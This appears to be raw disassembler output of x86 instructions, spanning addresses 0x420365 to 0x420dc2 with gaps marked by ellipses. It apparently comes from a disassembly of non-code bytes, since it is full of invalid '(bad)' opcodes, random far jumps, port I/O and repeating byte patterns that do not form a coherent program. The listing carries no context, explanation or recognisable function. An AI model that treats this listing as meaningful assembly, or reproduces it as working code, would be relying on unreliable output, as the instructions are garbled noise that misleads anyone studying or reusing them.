  420365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420366:	stos   DWORD PTR es:[edi],eax
  420367:	jg     0x42030a
  420369:	or     al,0xba
  42036b:	dec    ecx
  42036c:	mov    ebp,0x7be91049
  420371:	dec    esp
  420372:	mov    ds:0xc3a334cf,eax
  420377:	mov    esp,DWORD PTR [ecx+0x2e]
  42037a:	add    ch,dh
  42037c:	push   eax
  42037d:	(bad)  
  42037e:	fdivp  st(6),st
  420380:	adc    al,0x8
  420382:	xchg   edx,eax
  420383:	(bad)  
  420384:	scas   al,BYTE PTR es:[edi]
  420385:	pop    es
  420386:	xor    BYTE PTR [ebx+edx*4],dl
  420389:	push   0x68
  42038b:	adc    al,0xae
  42038d:	adc    dh,ch
  42038f:	ss leave 
  420391:	mov    ebp,0xc08c2365
  420396:	jne    0x1d8a452f
  42039c:	mov    eax,ds:0x366757c
  4203a1:	jmp    0xa95632dd
  4203a6:	aas    
  4203a7:	ins    DWORD PTR es:[edi],dx
  4203a8:	dec    eax
  4203a9:	push   edi
  4203aa:	push   ebx
  4203ab:	fcmovbe st,st(3)
  4203ad:	ret    0x8d2a
  4203b0:	fsubr  QWORD PTR [ecx+0x13062bcf]
  4203b6:	jle    0x420416
  4203b8:	jnp    0x4203a9
  4203ba:	xchg   ecx,eax
  4203bb:	jbe    0x4203d1
  4203bd:	nop
  4203be:	rcl    DWORD PTR [ebx-0x22],cl
  4203c1:	aad    0xe4
  4203c3:	ss mov esp,0xcd3cc58d
  4203c9:	xchg   edi,eax
  4203ca:	dec    esi
  4203cb:	test   DWORD PTR [eax+0xc],0xce1fa58b
  4203d2:	inc    ebx
  4203d3:	arpl   WORD PTR [ecx-0x75],cx
  4203d6:	add    esp,DWORD PTR [ecx+esi*4]
  4203d9:	scas   al,BYTE PTR es:[edi]
  4203da:	int    0x8
  4203dc:	mov    bh,0x9b
  4203de:	out    dx,al
  4203df:	xor    BYTE PTR [ebp+0x6a64a17a],bh
  4203e5:	push   es
  4203e6:	aaa    
  4203e7:	sar    BYTE PTR [ebx+0x544f6445],cl
  4203ed:	pop    ebx
  4203ee:	retf   0x7504
  4203f1:	in     eax,0x23
  4203f3:	ret    0x7b6e
  4203f6:	cmp    DWORD PTR [ebx+esi*2+0x69],ecx
  4203fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203fb:	test   ecx,0x914516b2
  420401:	xor    al,0x45
  420403:	loopne 0x4203c8
  420405:	push   eax
  420406:	das    
  420407:	sbb    dh,cl
  420409:	mov    dh,0xcb
  42040b:	adc    ebx,DWORD PTR ds:0x60052f6a
  420411:	test   eax,0xe28bf8f
  420416:	mov    ah,0x99
  420418:	inc    ebx
  420419:	xchg   ebx,eax
  42041a:	repz pusha 
  42041c:	out    0xa8,eax
  42041e:	sub    eax,0xa79e6c60
  420423:	in     al,dx
  420424:	imul   eax,DWORD PTR [eax+0x77],0x8aa96113
  42042b:	test   eax,eax
  42042d:	sub    bl,cl
  42042f:	lds    esp,FWORD PTR [esi+0x4a]
  420432:	pop    edi
  420433:	and    al,0x39
	...
  420495:	add    BYTE PTR [esi+0x7f125794],ch
  42049b:	shr    edi,cl
  42049d:	mov    esp,0xb41496f0
  4204a2:	xchg   edi,eax
  4204a3:	test   eax,0x568991e2
  4204a8:	add    DWORD PTR [eax],eax
  4204aa:	pop    es
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    BYTE PTR [edx],cl
  4204af:	sub    al,0x97
  4204b1:	or     eax,0x3d76f883
  4204b6:	dec    eax
  4204b7:	xchg   DWORD PTR [eax-0x53db2f08],edi
  4204bd:	data16 jo 0x420536
  4204c0:	xchg   ebx,eax
  4204c1:	and    al,0x4a
  4204c3:	out    dx,al
  4204c4:	and    al,0x6
  4204c6:	xchg   esi,eax
  4204c7:	adc    DWORD PTR [eax-0x36ccdbec],0xffffffc2
  4204ce:	loop   0x42051c
  4204d0:	mov    edx,0x86d1e8d6
  4204d5:	loop   0x420499
  4204d7:	nop
  4204d8:	jecxz  0x42054f
  4204da:	xor    eax,0x9f4a0178
  4204df:	out    dx,eax
  4204e0:	imul   edx,DWORD PTR [esi+0x6f],0x9c0abcfc
  4204e7:	scas   eax,DWORD PTR es:[edi]
  4204e8:	outs   dx,DWORD PTR ds:[esi]
  4204e9:	jge    0x420514
  4204eb:	outs   dx,BYTE PTR ds:[esi]
  4204ec:	dec    ebp
  4204ed:	sbb    edi,DWORD PTR [ebx]
  4204ef:	das    
  4204f0:	cld    
  4204f1:	(bad)  
  4204f3:	lea    edi,[ecx]
  4204f5:	sahf   
  4204f6:	data16 sbb ah,BYTE PTR [esi]
  4204f9:	cs jae 0x42052e
  4204fc:	cmp    DWORD PTR [eax],0xffffffe2
  4204ff:	std    
  420500:	inc    esi
  420501:	jno    0x42051e
  420503:	sub    cl,BYTE PTR [ecx]
  420505:	stos   BYTE PTR es:[edi],al
  420506:	jmp    0xf41:0x5b5b
  42050c:	add    eax,0xf1f3792a
  420511:	push   eax
  420512:	fs (bad) 
  420515:	sbb    BYTE PTR [ebp+0x4b],bh
  420518:	mov    es,ecx
  42051a:	es or  bl,ch
  42051d:	adc    edi,esi
  42051f:	adc    WORD PTR [eax],0xffce
  420523:	cwde   
  420524:	adc    al,0xed
  420526:	jo     0x42057c
  420528:	shl    BYTE PTR [esp+ecx*4+0x72],cl
  42052c:	mov    edx,0x691166a9
  420531:	xchg   esp,eax
  420532:	or     cl,BYTE PTR [ebx+0x7d76e18c]
  420538:	lods   eax,DWORD PTR ds:[esi]
  420539:	or     eax,0x9015e6df
  42053e:	fisubr WORD PTR [ecx-0x39327414]
  420544:	mov    eax,ds:0x313051a0
  420549:	inc    edi
  42054a:	push   edx
  42054b:	lods   eax,DWORD PTR ds:[esi]
  42054c:	rcr    edx,1
  42054e:	cld    
  42054f:	arpl   WORD PTR [edi-0xf563808],si
  420555:	inc    eax
  420556:	ins    BYTE PTR es:[edi],dx
  420557:	and    BYTE PTR [edi],0x7d
  42055a:	and    al,0x70
  42055c:	test   BYTE PTR [ebx],bh
  42055e:	je     0x420544
  420560:	hlt    
  420561:	mov    edi,DWORD PTR [edx]
  420563:	xor    ah,0x32
  420566:	adc    BYTE PTR [edi-0x56],0x58
  42056a:	sub    edi,DWORD PTR gs:[edi-0x18c13ccd]
  420571:	das    
  420572:	or     al,0x7b
  420574:	stc    
  420575:	push   0xfffffff9
  420577:	ss (bad) 
  420579:	out    0x99,al
  42057b:	loop   0x420543
  42057d:	mov    dh,0x61
  42057f:	sar    bl,1
  420581:	fdiv   st(3),st
  420583:	ret    
  420584:	sbb    eax,0x93f7f05d
  420589:	adc    al,0xdb
  42058b:	fdiv   st,st(1)
  42058d:	push   esi
  42058e:	pop    edx
  42058f:	mov    ds:0xea7d0b46,eax
  420594:	cdq    
  420595:	je     0x4205af
  420597:	sti    
  420598:	and    DWORD PTR [ebx],0x7c
  42059b:	pop    ss
  42059c:	sbb    al,BYTE PTR [si-0x68]
  4205a0:	cli    
  4205a1:	mov    cl,0x8a
  4205a3:	or     ch,bl
  4205a5:	xor    DWORD PTR [ecx+0x3caf7e61],0xffffff9b
  4205ac:	iret   
  4205ad:	outs   dx,DWORD PTR ds:[esi]
  4205ae:	scas   eax,DWORD PTR es:[edi]
  4205af:	loop   0x420558
  4205b1:	xor    al,0x9f
  4205b3:	jns    0x420608
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0xd6264102
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [esi-0x59c1b145],ch
  420633:	dec    esi
  420634:	xor    ecx,DWORD PTR [eax-0x44]
  420637:	add    al,0x11
  420639:	dec    ebp
  42063a:	jmp    0x591d:0xacea3b2f
  420641:	sbb    DWORD PTR [ebx-0x7],esp
  420644:	ret    0xaedc
  420647:	rcr    BYTE PTR [ebx],cl
  420649:	jns    0x420672
  42064b:	jp     0x4205e7
  42064d:	sbb    al,0xdb
  42064f:	out    dx,eax
  420650:	mov    BYTE PTR ds:0xe14da568,al
  420656:	pop    esp
  420657:	sub    esi,ebx
  420659:	adc    al,0x65
  42065b:	cmp    esi,DWORD PTR gs:[ecx-0x1fd5f08f]
  420662:	sbb    BYTE PTR [esi+ebp*1+0x59d530dd],bl
  420669:	pop    edx
  42066a:	sbb    DWORD PTR [edi+0x5d7fa096],esp
  420670:	div    BYTE PTR [esi+0x7]
  420673:	sahf   
  420674:	in     al,dx
  420675:	dec    ebx
  420676:	inc    esp
  420677:	into   
  420678:	scas   eax,DWORD PTR es:[edi]
  420679:	(bad)  
  42067a:	cmc    
  42067b:	dec    ecx
  42067c:	pop    es
  42067d:	adc    al,0x96
  42067f:	clc    
  420680:	cmp    BYTE PTR [edi*4-0x3bcddf59],dl
  420687:	dec    ecx
  420688:	cmp    ax,sp
  42068b:	retf   
  42068c:	jb     0x4206e1
  42068e:	xor    DWORD PTR [edx+0x3],esp
  420691:	sub    eax,0xde5ea539
  420696:	loope  0x42064a
  420698:	xchg   ebp,eax
  420699:	sbb    eax,0xa2a31841
  42069e:	jge    0x4206f3
  4206a0:	add    dl,bh
  4206a2:	adc    eax,0x56d5a550
  4206a7:	sbb    DWORD PTR [edx],edx
  4206a9:	jecxz  0x420660
  4206ab:	jge    0x420705
  4206ad:	sbb    al,0xbc
  4206af:	mov    WORD PTR ss:[esi+0x5],ss
  4206b3:	add    al,0x4
  4206b5:	iret   
  4206b6:	dec    ebx
  4206b7:	pop    esi
  4206b8:	adc    ah,ch
  4206ba:	lds    edx,FWORD PTR [ecx*2-0x54e3a915]
  4206c1:	jo     0x420661
  4206c3:	test   al,0xb3
  4206c5:	outs   dx,DWORD PTR ds:[esi]
  4206c6:	xchg   esp,eax
  4206c7:	ja     0x4206ad
  4206c9:	pop    esp
  4206ca:	add    DWORD PTR [ebp+0x40],edx
  4206cd:	rcl    BYTE PTR [eax+0xe],cl
  4206d0:	aas    
  4206d1:	hlt    
  4206d2:	in     al,0x82
  4206d4:	test   al,0x50
  4206d6:	stos   BYTE PTR es:[edi],al
  4206d7:	ror    DWORD PTR [edx-0x27],0x7a
  4206db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206dd:	cmp    eax,0x1712d042
  4206e2:	xor    DWORD PTR [ecx*4-0x79564e0e],edi
  4206e9:	push   ebx
  4206ea:	sbb    ah,BYTE PTR [eax-0x29]
  4206ed:	or     DWORD PTR [edx+0x6d],ebp
  4206f0:	(bad)  
  4206f1:	ret    
  4206f2:	xchg   ebx,eax
  4206f3:	add    BYTE PTR [ebx+0x45],bh
  4206f6:	push   ecx
  4206f7:	sbb    esp,DWORD PTR [esi+0x1fabdf90]
  4206fd:	inc    ecx
  4206fe:	jo     0x42077a
  420700:	adc    al,0x57
  420702:	cmc    
  420703:	sbb    BYTE PTR [ecx],al
  420705:	cld    
  420706:	cmp    al,dh
  420708:	cdq    
  420709:	or     al,al
  42070b:	inc    esi
  42070c:	jp     0x42077e
  42070e:	rcl    BYTE PTR [ebx],cl
  420710:	dec    ebx
  420711:	mov    ebx,0xb62d5031
  420716:	or     eax,0x45062afa
  42071b:	mov    cl,0x5f
  42071d:	dec    edx
  42071e:	fwait
  42071f:	nop
  420720:	push   ss
  420721:	mov    ch,0x6c
  420723:	mov    ah,0x4c
  420725:	into   
  420726:	pop    eax
  420727:	or     al,0xc9
  420729:	mov    eax,0x32331da6
  42072e:	push   es
  42072f:	mov    fs,WORD PTR [esi]
  420731:	test   DWORD PTR fs:[ebx+0xc],ecx
	...
  420795:	add    BYTE PTR [ecx-0x587fdad1],cl
  42079b:	mov    ch,BYTE PTR [ebp-0x642816d1]
  4207a1:	sub    ebx,DWORD PTR [eax-0x6854108e]
  4207a7:	pop    eax
  4207a8:	add    DWORD PTR [eax],eax
  4207aa:	pop    es
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    BYTE PTR [eax],dl
  4207af:	add    BYTE PTR [ecx-0x4adf02a3],ah
  4207b5:	jl     0x4207ed
  4207b7:	repz mov ds:0x4f01820b,al
  4207bd:	lds    eax,FWORD PTR [edi+ecx*8+0x2e]
  4207c1:	mov    al,0x70
  4207c3:	fwait
  4207c4:	inc    edi
  4207c5:	xchg   esi,eax
  4207c6:	jmp    0x76bf24e8
  4207cb:	cli    
  4207cc:	pop    esp
  4207cd:	jbe    0x420805
  4207cf:	push   0xb1493b8b
  4207d4:	lods   al,BYTE PTR ds:[esi]
  4207d5:	pop    ebx
  4207d6:	sub    BYTE PTR [eax],bl
  4207d8:	jbe    0x42079e
  4207da:	stc    
  4207db:	scas   al,BYTE PTR es:[edi]
  4207dc:	fbstp  TBYTE PTR [ecx]
  4207de:	inc    ebp
  4207df:	jo     0x4207fc
  4207e1:	xor    ecx,eax
  4207e3:	push   0xffffffbc
  4207e5:	inc    ebx
  4207e6:	(bad)  
  4207e7:	xor    DWORD PTR [ebp+eax*1+0x6fdc4237],ecx
  4207ee:	ror    BYTE PTR [eax+0x3003c07c],1
  4207f4:	mov    eax,0x881314ac
  4207f9:	jmp    0xefcd99ef
  4207fe:	xchg   ebp,eax
  4207ff:	cs cld 
  420801:	sbb    DWORD PTR [edx],eax
  420803:	rcr    DWORD PTR [esi],0x4f
  420806:	in     al,0xfa
  420808:	and    DWORD PTR [esi-0x676bb65c],0xec1ef916
  420812:	sbb    ecx,DWORD PTR [edx-0x1289504e]
  420818:	push   esi
  420819:	xchg   DWORD PTR [ebp+0xe6c36f6],eax
  42081f:	jmp    0x42087c
  420821:	jle    0x4207c4
  420823:	enter  0xc598,0xdc
  420827:	call   0x7617543
  42082c:	mov    edx,0x40f1c218
  420831:	cmp    eax,0xdbe52bae
  420836:	add    al,BYTE PTR [esi+0x2eb1a017]
  42083c:	dec    esp
  42083d:	lds    edi,FWORD PTR [ebp+ecx*4-0x47]
  420841:	cmp    eax,DWORD PTR [ecx]
  420843:	sbb    al,0x9b
  420845:	inc    ebp
  420846:	cmp    esi,DWORD PTR [ecx+0x42]
  420849:	push   gs
  42084b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42084c:	mov    ah,0x72
  42084e:	je     0x42081c
  420850:	sbb    al,0xd7
  420852:	mov    WORD PTR gs:[eax+0x37b29ef0],?
  420859:	dec    eax
  42085a:	enter  0x8b25,0x2c
  42085e:	and    al,BYTE PTR [ecx+ebx*4+0x5fa96dce]
  420865:	xor    dl,0x3c
  420868:	or     al,0xd3
  42086a:	push   0xffffffcb
  42086c:	dec    eax
  42086d:	cwde   
  42086e:	fstp   DWORD PTR [edi]
  420870:	pusha  
  420871:	int3   
  420872:	xor    esi,DWORD PTR [edi]
  420874:	aas    
  420875:	mov    esi,0xaeb0abd5
  42087a:	popf   
  42087b:	dec    ebx
  42087c:	in     eax,dx
  42087d:	jle    0x4208b3
  42087f:	fmul   QWORD PTR ds:0x882f2eda
  420885:	xor    al,0x85
  420887:	fisubr DWORD PTR [edx-0x4a]
  42088a:	in     al,dx
  42088b:	mov    ah,0x90
  42088d:	mov    ah,0x17
  42088f:	shl    DWORD PTR ds:0x957a1c4,1
  420895:	imul   ecx,DWORD PTR [ebx],0xffffffd0
  420898:	xchg   ebp,eax
  420899:	xor    cl,ch
  42089b:	push   esp
  42089c:	(bad)  
  42089d:	xor    dh,dl
  42089f:	int    0x97
  4208a1:	fs stos DWORD PTR es:[edi],eax
  4208a3:	mov    DWORD PTR [edx],ebx
  4208a5:	lahf   
  4208a6:	xchg   BYTE PTR [ebx],bh
  4208a8:	sbb    al,0xea
  4208aa:	dec    ecx
  4208ab:	fisubr WORD PTR [ebp+0x6d]
  4208ae:	pop    esp
  4208af:	pop    ebp
  4208b0:	stc    
  4208b1:	fwait
  4208b2:	popa   
  4208b3:	pop    edx
  4208b4:	sbb    eax,DWORD PTR [eax]
	...
  420916:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0xf7f5
  420924:	and    dl,BYTE PTR [ebp-0x62]
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR [ebx+0x18],ch
  420930:	jnp    0x4208ec
  420932:	mov    ecx,es
  420934:	mov    esp,0x7e17e0d
  420939:	adc    dh,BYTE PTR [ebp+ecx*4-0x611e20a2]
  420940:	stc    
  420941:	(bad)  
  420942:	jecxz  0x420921
  420944:	xor    cl,BYTE PTR [eax]
  420946:	inc    ebp
  420947:	fadd   QWORD PTR [ebx-0x334d7878]
  42094d:	mov    ch,0x1c
  42094f:	aas    
  420950:	rcr    BYTE PTR [ecx+ebp*2],0x33
  420954:	pop    edi
  420955:	dec    edi
  420956:	sub    al,0xb
  420958:	jge    0x420982
  42095a:	pushf  
  42095b:	aaa    
  42095c:	imul   ecx,DWORD PTR [ebx+0x45],0xdba4daa5
  420963:	mov    ah,0x1e
  420965:	jns    0x420922
  420967:	cs sahf 
  420969:	lods   al,BYTE PTR ds:[esi]
  42096a:	push   0x843c7212
  42096f:	sub    BYTE PTR [edx],dh
  420971:	out    0xf2,eax
  420973:	lahf   
  420974:	fs cmp eax,0x216ee1d2
  42097a:	in     eax,dx
  42097b:	loope  0x4209a4
  42097d:	jle    0x4209c1
  42097f:	mov    ds,WORD PTR [eax]
  420981:	pop    esi
  420982:	int3   
  420983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420984:	std    
  420985:	pop    edx
  420986:	hlt    
  420987:	mov    edx,0x6f93cd93
  42098c:	cs push es
  42098e:	test   al,0x80
  420990:	les    ebx,FWORD PTR [ebp+0x3f3223d8]
  420996:	add    eax,0x93007bf
  42099b:	jmp    0x47a8a9ff
  4209a0:	dec    esp
  4209a1:	mov    cs,WORD PTR [ebp-0x40]
  4209a4:	xchg   ebp,eax
  4209a5:	mov    ebp,0x880d535e
  4209aa:	xchg   esp,eax
  4209ab:	mov    dh,0xae
  4209ad:	clc    
  4209ae:	leave  
  4209af:	ret    0xbd72
  4209b2:	hlt    
  4209b3:	or     BYTE PTR [eax+eax*8],bl
  4209b6:	sub    edi,eax
  4209b8:	ins    DWORD PTR es:[edi],dx
  4209b9:	data16 loope 0x4209ab
  4209bc:	cmp    BYTE PTR [ebx+0x7f],cl
  4209bf:	xchg   DWORD PTR [edi],esp
  4209c1:	sub    DWORD PTR [esi+edx*8-0x5ce1ab19],ecx
  4209c8:	add    al,0xd9
  4209ca:	inc    ebp
  4209cb:	push   esp
  4209cc:	jne    0x42094f
  4209ce:	sub    BYTE PTR [ecx-0x123008c6],al
  4209d4:	pop    ebp
  4209d5:	mov    ah,0x89
  4209d7:	cmp    al,0xeb
  4209d9:	xor    ah,bh
  4209db:	mov    ebx,0xb1af14fb
  4209e0:	fldcw  WORD PTR [ebx+eiz*4-0x2acf687f]
  4209e7:	enter  0xffa5,0x65
  4209eb:	adc    BYTE PTR [edi],dh
  4209ed:	xchg   BYTE PTR [eax],ch
  4209ef:	dec    edx
  4209f0:	xor    eax,0xa877e94c
  4209f5:	xor    edx,DWORD PTR ds:0x544bb31c
  4209fb:	iret   
  4209fc:	lods   eax,DWORD PTR ds:[esi]
  4209fd:	jmp    0x420a50
  4209ff:	sub    eax,0x10caeea9
  420a04:	mov    esp,0x9138e1fc
  420a09:	inc    edi
  420a0a:	cmc    
  420a0b:	(bad)  
  420a0c:	jg     0x4209c7
  420a0e:	fcomp  st(2)
  420a10:	es sahf 
  420a12:	jecxz  0x420a03
  420a14:	add    ebx,ebx
  420a16:	push   ss
  420a17:	dec    ebp
  420a18:	xor    eax,0xc86aee7b
  420a1d:	rcr    bh,1
  420a1f:	(bad)  [ebx+edi*4]
  420a22:	jo     0x420a21
  420a24:	sub    al,0x42
  420a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a27:	xchg   ebp,eax
  420a28:	add    DWORD PTR [edi*1+0x4f878fc0],esi
  420a2f:	cmp    ah,dh
  420a31:	or     eax,0x18f939
	...
  420a96:	fbstp  TBYTE PTR [edx]
  420a98:	scas   eax,DWORD PTR es:[edi]
  420a99:	adc    ebp,edi
  420a9b:	lahf   
  420a9c:	(bad)  
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   BYTE PTR [edi-0x2f],dh
  420aa4:	fldcw  WORD PTR [ebx]
  420aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aa7:	pop    edx
  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [eax-0x29],bh
  420ab0:	mov    bh,0xd5
  420ab2:	cmp    edi,DWORD PTR [edx-0x8]
  420ab5:	in     eax,dx
  420ab6:	jnp    0x420af4
  420ab8:	add    ah,BYTE PTR [eax+eiz*8-0x58c8f901]
  420abf:	dec    esi
  420ac0:	xor    al,0xba
  420ac2:	hlt    
  420ac3:	or     BYTE PTR [esi+0x73],0x47
  420ac7:	sbb    BYTE PTR [ebx-0x66bad7f4],dh
  420acd:	ror    DWORD PTR [edi-0x8d69287],0x6d
  420ad4:	dec    ebp
  420ad5:	mov    edx,0x9155d619
  420ada:	cdq    
  420adb:	or     al,0x36
  420add:	jo     0x420ac3
  420adf:	pop    ds
  420ae0:	dec    edx
  420ae1:	scas   eax,DWORD PTR es:[edi]
  420ae2:	pop    ss
  420ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ae4:	call   0xb2bd7a4d
  420ae9:	enter  0x2bde,0x8f
  420aed:	(bad)  
  420aee:	and    eax,0x27cfa716
  420af3:	sub    BYTE PTR [ecx+ebp*8],cl
  420af6:	jne    0x420a99
  420af8:	in     al,dx
  420af9:	loope  0x420ad5
  420afb:	sub    eax,0xec555ac5
  420b00:	xchg   ebx,eax
  420b01:	fstp   QWORD PTR [esi]
  420b03:	sub    eax,0x5150317b
  420b08:	add    eax,edi
  420b0a:	sbb    esi,edx
  420b0c:	test   eax,0x4e554944
  420b11:	ins    BYTE PTR es:[edi],dx
  420b12:	cmp    ah,dh
  420b14:	sar    BYTE PTR [edx-0x5f],0x94
  420b18:	inc    eax
  420b19:	addr16 pushf 
  420b1b:	xor    edi,DWORD PTR ds:[ecx-0x497e0d86]
  420b22:	aad    0x63
  420b24:	cmc    
  420b25:	es jbe 0x420b3e
  420b28:	xor    DWORD PTR [esi+0x6b],ebx
  420b2b:	aam    0xa2
  420b2d:	int    0xa2
  420b2f:	cmc    
  420b30:	mov    ah,0x14
  420b32:	out    dx,al
  420b33:	call   0x243:0x6fb12095
  420b3a:	xchg   esp,eax
  420b3b:	jmp    0x40f7:0xd238b2b7
  420b42:	xchg   esi,eax
  420b43:	jmp    0x66c1:0x6caf7d2d
  420b4a:	sub    eax,0x639ff70
  420b4f:	repnz and dl,cl
  420b52:	sub    eax,0xe455a3a
  420b57:	mov    ah,0x88
  420b59:	imul   esi,DWORD PTR [esp+ebp*1-0x20],0x156c7f62
  420b61:	pop    esi
  420b62:	mov    bl,0x3a
  420b64:	push   esi
  420b65:	jnp    0x420bb0
  420b67:	mov    edi,esi
  420b69:	push   ecx
  420b6a:	in     eax,dx
  420b6b:	imul   esp,DWORD PTR [ebx],0x7b
  420b6e:	sbb    DWORD PTR fs:[esi],0x699c02d3
  420b75:	lods   eax,DWORD PTR ds:[esi]
  420b76:	ss loop 0x420bd8
  420b79:	retf   0x28a3
  420b7c:	nop
  420b7d:	pop    ebx
  420b7e:	pop    ds
  420b7f:	data16 daa 
  420b81:	rol    BYTE PTR [ebx+0x5ad1aaed],0x6e
  420b88:	push   ds
  420b89:	dec    esp
  420b8a:	adc    DWORD PTR [esi+0x39630cbb],esi
  420b90:	sub    al,0xe7
  420b92:	ins    DWORD PTR es:[edi],dx
  420b93:	mov    WORD PTR [eax+ecx*8+0x1],gs
  420b97:	xchg   ecx,eax
  420b98:	push   eax
  420b99:	cmc    
  420b9a:	cli    
  420b9b:	jecxz  0x420c19
  420b9d:	sub    DWORD PTR [esp+ebx*1+0x2f],0xffffffaa
  420ba2:	scas   al,BYTE PTR es:[edi]
  420ba3:	imul   esi,DWORD PTR [ecx],0x56a8faac
  420ba9:	test   bl,0x88
  420bac:	test   al,0x18
  420bae:	iret   
  420baf:	pop    edi
  420bb0:	sbb    eax,0x1317fe8
	...
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	outs   dx,DWORD PTR ds:[esi]
  420c23:	mov    bh,0x7e
  420c25:	sahf   
  420c26:	lods   al,BYTE PTR ds:[esi]
  420c27:	pop    ebx
  420c28:	add    DWORD PTR [eax],eax
  420c2a:	pop    es
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [esi],bh
  420c2f:	fld    QWORD PTR [eax+0x77404fa]
  420c35:	fdivr  DWORD PTR [ebx+esi*1-0x2a3bab64]
  420c3c:	std    
  420c3d:	jae    0x420c8a
  420c3f:	push   ss
  420c40:	cmp    ebp,ecx
  420c42:	jmp    0xa63:0x62c92872
  420c49:	cmp    al,0x4
  420c4b:	sahf   
  420c4c:	sbb    BYTE PTR [ecx],dh
  420c4e:	scas   eax,DWORD PTR es:[edi]
  420c4f:	ffree  st(1)
  420c51:	retf   
  420c52:	int    0x10
  420c54:	into   
  420c55:	xchg   ebx,eax
  420c56:	outs   dx,BYTE PTR ds:[esi]
  420c57:	ja     0x420c09
  420c59:	pop    ecx
  420c5a:	xchg   esi,ebx
  420c5c:	dec    ebx
  420c5d:	dec    esp
  420c5e:	pop    esi
  420c5f:	cmp    ecx,0x40
  420c62:	(bad)  
  420c63:	sbb    DWORD PTR [ebx-0x7e08bce5],ebp
  420c69:	cld    
  420c6a:	out    0x47,eax
  420c6c:	and    BYTE PTR [edi-0x42f69c06],ah
  420c72:	call   0x1fe3c931
  420c77:	das    
  420c78:	dec    eax
  420c79:	mov    BYTE PTR [ecx+esi*4],dl
  420c7c:	xchg   ebp,eax
  420c7d:	in     al,0x1f
  420c7f:	mov    ebp,0xcb9d96e9
  420c84:	xchg   BYTE PTR [eax-0x1],dh
  420c87:	cmp    al,0xcc
  420c89:	cld    
  420c8a:	in     eax,dx
  420c8b:	sbb    ah,BYTE PTR [ebx+0x1a]
  420c8e:	imul   edi,eax,0xffffff8e
  420c91:	(bad)  
  420c92:	mov    esp,0x1c6e88e3
  420c97:	add    cl,BYTE PTR [edx]
  420c99:	add    eax,0x8e235006
  420c9e:	lods   al,BYTE PTR ds:[esi]
  420c9f:	inc    eax
  420ca0:	mov    bh,0x79
  420ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca3:	dec    edi
  420ca4:	leave  
  420ca5:	add    DWORD PTR ds:0xf414d9f7,esi
  420cab:	pop    edi
  420cac:	int3   
  420cad:	inc    DWORD PTR [edi]
  420caf:	xchg   ebp,eax
  420cb0:	pop    di
  420cb2:	xor    BYTE PTR [esi-0x609fd9cc],dl
  420cb8:	push   esp
  420cb9:	mov    dh,0x0
  420cbb:	dec    esp
  420cbc:	add    DWORD PTR [edi+0x4b],esp
  420cbf:	loopne 0x420d00
  420cc1:	les    edx,FWORD PTR [edx+0x7ee0291d]
  420cc7:	xor    edi,DWORD PTR [ebx]
  420cc9:	inc    ebp
  420cca:	and    bh,BYTE PTR [esi]
  420ccc:	or     BYTE PTR [edi-0x57],bl
  420ccf:	xchg   esi,eax
  420cd0:	pop    esi
  420cd1:	jnp    0x420cd8
  420cd3:	or     cl,BYTE PTR [ebx-0x70]
  420cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cd7:	adc    BYTE PTR [eax+0x72],cl
  420cda:	mov    al,ds:0x26f7c2a2
  420cdf:	inc    ecx
  420ce0:	cmp    ch,BYTE PTR [edx]
  420ce2:	jmp    0xdd95:0xdb4872ff
  420ce9:	add    eax,0x1cdfde40
  420cee:	xor    DWORD PTR [ebp-0x66b9ad23],ebp
  420cf4:	(bad)  
  420cf5:	in     al,dx
  420cf6:	fcomp  DWORD PTR [edx-0x51b34146]
  420cfc:	(bad)
  420cff:	push   esp
  420d00:	cmp    BYTE PTR [edi+0x15a2f290],cl
  420d06:	inc    ebx
  420d07:	rol    BYTE PTR [ecx-0x5b2b4684],0x90
  420d0e:	mov    ecx,0xcfda5893
  420d13:	aas    
  420d14:	test   eax,0x9661419a
  420d19:	std    
  420d1a:	hlt    
  420d1b:	stc    
  420d1c:	lock xchg esp,eax
  420d1e:	adc    al,0xba
  420d20:	daa    
  420d21:	call   0x6df7:0x59ddbcc4
  420d28:	adc    BYTE PTR fs:[ebx+0x1f4f2f69],bl
  420d2f:	icebp  
  420d30:	jno    0x420d10
  420d32:	push   ss
  420d33:	lods   al,BYTE PTR ds:[esi]
  420d34:	and    BYTE PTR [eax],al
	...
  420d96:	out    0x1e,eax
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x6c0c1cea
  420da3:	jmp    0x5cf550f4
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR [eax],al
  420daf:	adc    BYTE PTR [eax+0x162dc26d],cl
  420db5:	shl    edx,0x3
  420db8:	imul   ebx,edx,0x39
  420dbb:	cmp    BYTE PTR [ebp+0x70a08589],0xf7
  420dc2:	in     al,0x82
